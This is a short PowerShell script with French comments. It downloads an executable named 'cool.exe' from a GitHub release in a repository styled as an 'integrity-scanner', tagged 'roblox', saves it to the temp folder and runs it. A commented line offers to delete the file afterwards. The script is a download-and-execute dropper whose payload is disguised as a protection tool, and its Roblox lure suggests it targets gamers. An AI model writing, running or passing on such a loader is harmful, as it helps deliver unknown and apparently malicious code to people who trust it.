# T2+.ps1 : télécharge et exécute l'exe avec option "désinstallation"
$exeUrl = 'https://github.com/client-protection/integrity-scanner/releases/download/roblox/cool.exe'
$out = Join-Path $env:TEMP 'cool.exe'

# Télécharger l'exécutable
Invoke-WebRequest -Uri $exeUrl -OutFile $out -UseBasicParsing

# Lancer l'exécutable
Start-Process -FilePath $out -Wait

# ----------------------------
# Option de suppression (désinstallation)
# Décommente la ligne ci-dessous quand tu veux supprimer l'exe
# Remove-Item -Path $out -Force
# ----------------------------
